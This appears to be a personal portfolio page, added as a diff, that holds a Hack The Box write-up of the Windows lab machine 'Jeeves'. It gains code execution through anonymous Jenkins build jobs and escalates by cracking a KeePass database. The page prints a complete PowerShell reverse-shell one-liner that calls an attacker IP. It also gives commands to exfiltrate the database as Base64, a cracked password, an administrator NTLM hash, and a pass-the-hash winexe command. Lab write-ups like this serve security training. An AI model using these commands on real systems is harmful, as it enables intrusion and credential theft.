@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="Hack The Box practice notes for Jeeves by Darrin Jackson.">
+<title>Jeeves | Writeups | Darrin Jackson</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/site.css">
+
+<style>
+.writeup-tools{display:flex;gap:8px;flex-wrap:wrap;margin-top:18px}
+.writeup-chip{font:600 .68rem/1 var(--mono);padding:7px 9px;border:1px solid var(--line);border-radius:999px;background:var(--panel);color:var(--text-soft)}
+.writeup-back{display:inline-flex;margin-bottom:20px;text-decoration:none;font:600 .75rem/1 var(--mono);color:var(--muted)}
+.writeup-back:hover{color:var(--text)}
+.lab-notes{max-width:900px}
+.lab-notes h1{font-size:1.85rem;letter-spacing:-.025em;margin:44px 0 16px;padding-top:6px}
+.lab-notes h2{font-size:1.35rem;margin:34px 0 13px;padding-top:6px}
+.lab-notes h3{font-size:1.08rem;margin:27px 0 10px}
+.lab-notes h4{font-size:.98rem;margin:22px 0 8px}
+.lab-notes p,.lab-notes li{color:var(--text-soft)}
+.lab-notes ul,.lab-notes ol{padding-left:24px}
+.lab-notes li+li{margin-top:5px}
+.lab-notes hr{border:0;border-top:1px solid var(--line);margin:34px 0}
+.lab-notes pre{overflow:auto;background:#08080a;border:1px solid var(--line);border-radius:7px;padding:16px;font-size:.81rem;line-height:1.55;color:#e3e3e7}
+.lab-notes code{font-family:var(--mono);color:#f2d978}
+.lab-notes pre code{color:inherit}
+.lab-notes table{width:100%;border-collapse:collapse;margin:18px 0 26px;font-size:.88rem;background:var(--panel)}
+.lab-notes th,.lab-notes td{border:1px solid var(--line);padding:9px 11px;text-align:left;vertical-align:top}
+.lab-notes th{font:600 .72rem/1.4 var(--mono);text-transform:uppercase;letter-spacing:.04em;color:var(--text-soft);background:var(--panel-2)}
+.lab-notes blockquote{margin:20px 0;padding:12px 16px;border-left:3px solid var(--purple);background:var(--purple-soft);color:var(--text-soft)}
+.lab-notes blockquote p{margin:0;color:inherit}
+.lab-notes a{color:#cbb8ff;text-underline-offset:3px}
+.source-note{margin:0 0 28px;padding:12px 14px;border:1px solid var(--line);border-radius:7px;background:var(--bg-soft);color:var(--muted);font-size:.85rem}
+@media(max-width:650px){.lab-notes table{display:block;overflow-x:auto}.lab-notes h1{font-size:1.55rem}}
+</style>
+
+</head>
+<body><div class="shell">
+<header class="topbar"><nav class="nav">
+<a class="brand" href="/"><span class="brand-name">Darrin Jackson</span><span class="brand-sub">portfolio</span></a>
+<div class="navlinks"><a data-nav href="/work/">Work</a><a data-nav href="/research/">Writeups</a><a data-nav href="/lab/">Lab</a><a data-nav href="/about/">About</a></div>
+</nav></header>
+<main class="container">
+<a class="writeup-back" href="/research/">← Back to Writeups</a>
+<header class="page-head">
+  <div class="kicker">HTB Practice Lab</div>
+  <h1>Jeeves</h1>
+  <p>Original practice notes covering the exposed Jenkins foothold, KeePass credential recovery, pass-the-hash, and final privilege escalation.</p>
+  <div class="writeup-tools"><span class="writeup-chip">Hack The Box</span><span class="writeup-chip">Windows · Medium</span></div>
+</header>
+<div class="source-note">This page is a direct HTML transfer of my original practice notes. The technical content, commands, findings, and attack path have been kept intact rather than rewritten into a different walkthrough.</div>
+<article class="article lab-notes">
+<h1 id="htb---jeeves">HTB - Jeeves</h1>
+<p><strong>Difficulty:</strong> Medium<br />
+<strong>OS:</strong> Windows</p>
+<hr />
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<p>As always, begin with a full service and version scan.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sV</span> <span class="at">-sC</span> <span class="at">-A</span> <span class="at">-oN</span> initscan 10.129.228.112</span></code></pre></div>
+<h3 id="results">Results</h3>
+<pre><code>80/tcp     Microsoft IIS 10.0
+135/tcp    MSRPC
+445/tcp    SMB
+50000/tcp  Jetty 9.4.z-SNAPSHOT</code></pre>
+<h3 id="initial-observations">Initial Observations</h3>
+<ul>
+<li>Standard Windows services:
+<ul>
+<li>HTTP (80)</li>
+<li>RPC (135)</li>
+<li>SMB (445)</li>
+</ul></li>
+<li>An additional HTTP service is listening on <strong>TCP/50000</strong>.</li>
+<li>Nmap identifies the service as <strong>Jetty</strong>, but only returns a generic <strong>404 Not Found</strong> page.</li>
+</ul>
+<p>The Jetty service stood out because it is non-standard and often hosts Java applications such as Jenkins, making it the highest-value target during initial enumeration.</p>
+<hr />
+<h1 id="web-enumeration">Web Enumeration</h1>
+<p>After adding the target to <code>/etc/hosts</code>:</p>
+<pre class="text"><code>10.129.228.112 jeeves.htb</code></pre>
+<p>Run Gobuster against the Jetty service:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">gobuster</span> dir <span class="dt">\</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>-u http://jeeves.htb:50000 <span class="dt">\</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></code></pre></div>
+<p>Interesting discovery:</p>
+<pre><code>/askjeeves</code></pre>
+<p>Browsing to:</p>
+<pre><code>http://jeeves.htb:50000/askjeeves</code></pre>
+<p>reveals a <strong>Jenkins Dashboard</strong>.</p>
+<hr />
+<h1 id="initial-foothold">Initial Foothold</h1>
+<p>The Jenkins instance allows anonymous users to create and execute build jobs.</p>
+<p>Create a new project:</p>
+<pre><code>New Item
+    ↓
+Freestyle Project
+    ↓
+Build
+    ↓
+Execute Windows Batch Command</code></pre>
+<p>Inside the build step, execute a PowerShell reverse shell.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>powershell <span class="op">-</span>NoP <span class="op">-</span>NonI <span class="op">-</span>W Hidden <span class="op">-</span>ExecutionPolicy Bypass <span class="op">-</span>Command <span class="st">&quot;</span><span class="va">$client</span><span class="st">=New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.25&#39;,4444);</span><span class="va">$stream</span><span class="st">=</span><span class="va">$client</span><span class="st">.GetStream();[byte[]]</span><span class="va">$bytes</span><span class="st">=0..65535|%%{0};while((</span><span class="va">$i</span><span class="st">=</span><span class="va">$stream</span><span class="st">.Read(</span><span class="va">$bytes</span><span class="st">,0,</span><span class="va">$bytes</span><span class="st">.Length)) -ne 0){</span><span class="va">$data</span><span class="st">=(New-Object System.Text.ASCIIEncoding).GetString(</span><span class="va">$bytes</span><span class="st">,0,</span><span class="va">$i</span><span class="st">);</span><span class="va">$sendback</span><span class="st">=(iex </span><span class="va">$data</span><span class="st"> 2&gt;&amp;1 | Out-String);</span><span class="va">$sendback2</span><span class="st">=</span><span class="va">$sendback</span><span class="st">+&#39;PS &#39;+(pwd).Path+&#39;&gt; &#39;;</span><span class="va">$sendbyte</span><span class="st">=([text.encoding]::ASCII).GetBytes(</span><span class="va">$sendback2</span><span class="st">);</span><span class="va">$stream</span><span class="st">.Write(</span><span class="va">$sendbyte</span><span class="st">,0,</span><span class="va">$sendbyte</span><span class="st">.Length);</span><span class="va">$stream</span><span class="st">.Flush()};</span><span class="va">$client</span><span class="st">.Close()&quot;</span></span></code></pre></div>
+<p>Start a listener:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-lvnp</span> 4444</span></code></pre></div>
+<p>Trigger the build.</p>
+<p>A reverse shell connects back as:</p>
+<pre class="text"><code>jeeves\kohsuke</code></pre>
+<p>Retrieve the user flag before beginning privilege escalation.</p>
+<hr />
+<h1 id="privilege-escalation-enumeration">Privilege Escalation Enumeration</h1>
+<p>While enumerating the filesystem, several Jenkins-related files are discovered.</p>
+<h2 id="jenkins-user-configuration">Jenkins User Configuration</h2>
+<pre><code>C:\Users\Administrator\.jenkins\users\admin\config.xml</code></pre>
+<p>Interesting information contained inside:</p>
+<ul>
+<li>Jenkins API token</li>
+<li>BCrypt password hash</li>
+<li>Jenkins configuration</li>
+</ul>
+<hr />
+<h2 id="jenkins-secrets">Jenkins Secrets</h2>
+<pre><code>C:\Users\Administrator\.jenkins\secrets.key</code></pre>
+<p>and</p>
+<pre><code>C:\Users\Administrator\.jenkins\secrets\master.key</code></pre>
+<p>These files are used internally by Jenkins to encrypt sensitive data.</p>
+<hr />
+<h2 id="keepass-database">KeePass Database</h2>
+<p>Another interesting discovery:</p>
+<pre><code>C:\Users\kohsuke\Documents\CEH.kdbx</code></pre>
+<p>Since KeePass databases often contain administrator credentials, this becomes the primary target.</p>
+<hr />
+<h1 id="exfiltrating-files">Exfiltrating Files</h1>
+<p>Without an easy file transfer mechanism, encode the files as Base64 directly from PowerShell.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="op">[</span>System<span class="op">.</span><span class="fu">Convert</span><span class="op">]::</span>ToBase64String<span class="op">(</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    <span class="op">[</span>System<span class="op">.</span><span class="fu">IO</span><span class="op">.</span><span class="fu">File</span><span class="op">]::</span>ReadAllBytes<span class="op">(</span><span class="st">&quot;[C:\path\to\file](C:\Users\kohsuke\Documents\CEH.kdbx)&quot;</span><span class="op">)</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="op">)</span></span></code></pre></div>
+<p>After copying the Base64 output back to the attack box, decoded with:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">base64</span> <span class="at">-d</span> encoded.txt <span class="op">&gt;</span> CEH.kdbx</span></code></pre></div>
+<hr />
+<h1 id="cracking-the-keepass-database">Cracking the KeePass Database</h1>
+<p>Generate a hash:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="ex">keepass2john</span> CEH.kdbx <span class="op">&gt;</span> keepass.hash</span></code></pre></div>
+<p>Crack it using Hashcat:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hashcat</span> <span class="at">-m</span> 13400 keepass.hash /usr/share/wordlists/rockyou.txt</span></code></pre></div>
+<p>Recovered password:</p>
+<pre><code>moonshine1</code></pre>
+<p>Open the KeePass database using the recovered password.</p>
+<p>Inside is an NTLM hash for the local Administrator account:</p>
+<pre><code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code></pre>
+<hr />
+<h1 id="pass-the-hash">Pass-the-Hash</h1>
+<p>Authenticate using the Administrator NTLM hash with Winexe.</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">winexe</span> <span class="at">--pw-nt-hash</span> <span class="dt">\</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>-U <span class="st">&#39;administrator%e0fb1fb85756c24235ff238cbe81fe00&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>//10.129.228.112 cmd.exe</span></code></pre></div>
+<p>Successful authentication provides an Administrator shell.</p>
+<p>Verify:</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a>whoami</span></code></pre></div>
+<pre><code>jeeves\administrator</code></pre>
+<hr />
+<h1 id="finding-the-root-flag">Finding the Root Flag</h1>
+<p>Checking the Administrator desktop initially appears unsuccessful.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="bu">type</span> C:\Users\Administrator\Desktop\hm.txt</span></code></pre></div>
+<p>Contents:</p>
+<pre><code>The flag is elsewhere. Look deeper.</code></pre>
+<p>This hint suggests an Alternate Data Stream (ADS).</p>
+<p>Enumerate ADS:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="bu">dir</span> <span class="at">/r</span></span></code></pre></div>
+<p>Output:</p>
+<pre><code>hm.txt
+hm.txt:root.txt:$DATA</code></pre>
+<p>Read the hidden stream:</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="kw">more</span> <span class="kw">&lt;</span> hm.txt:root.txt</span></code></pre></div>
+<p>or</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode cmd"><code class="sourceCode dosbat"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="bu">type</span> hm.txt:root.txt</span></code></pre></div>
+<p>The hidden ADS contains the root flag.</p>
+<hr />
+<h1 id="attack-path-summary">Attack Path Summary</h1>
+<pre><code>Nmap
+      │
+      ▼
+Jetty Service (50000)
+      │
+      ▼
+Gobuster
+      │
+      ▼
+/askjeeves
+      │
+      ▼
+Anonymous Jenkins Access
+      │
+      ▼
+Create Freestyle Build
+      │
+      ▼
+PowerShell Reverse Shell
+      │
+      ▼
+Shell as kohsuke
+      │
+      ▼
+Discover KeePass Database
+      │
+      ▼
+Extract Database
+      │
+      ▼
+keepass2john
+      │
+      ▼
+Hashcat
+      │
+      ▼
+Recover KeePass Password
+      │
+      ▼
+Retrieve Administrator NTLM Hash
+      │
+      ▼
+Pass-the-Hash (Winexe)
+      │
+      ▼
+Administrator Shell
+      │
+      ▼
+Enumerate Alternate Data Streams
+      │
+      ▼
+Read root.txt ADS</code></pre>
+<hr />
+<h1 id="key-takeaways">Key Takeaways</h1>
+<ul>
+<li>Non-standard web ports often host administrative applications such as Jenkins.</li>
+<li>Misconfigured Jenkins instances can allow anonymous users to execute arbitrary code through build jobs.</li>
+<li>KeePass databases are valuable credential targets during post-exploitation.</li>
+<li>NTLM hashes can frequently be leveraged directly with Pass-the-Hash without cracking the underlying password.</li>
+<li>Windows Alternate Data Streams (ADS) can hide files from normal directory listings and are worth checking whenever hints suggest hidden data.</li>
+</ul>
+<h1 id="tools-used">Tools Used</h1>
+<ul>
+<li>Nmap</li>
+<li>Gobuster</li>
+<li>Jenkins</li>
+<li>PowerShell</li>
+<li>Netcat</li>
+<li>keepass2john</li>
+<li>Hashcat</li>
+<li>Winexe</li>
+</ul>
+
+</article>
+</main>
+<footer class="footer"><div class="container"><span>© 2026 Darrin Jackson</span></div></footer>
+<script src="/assets/js/site.js"></script></div></body></html>
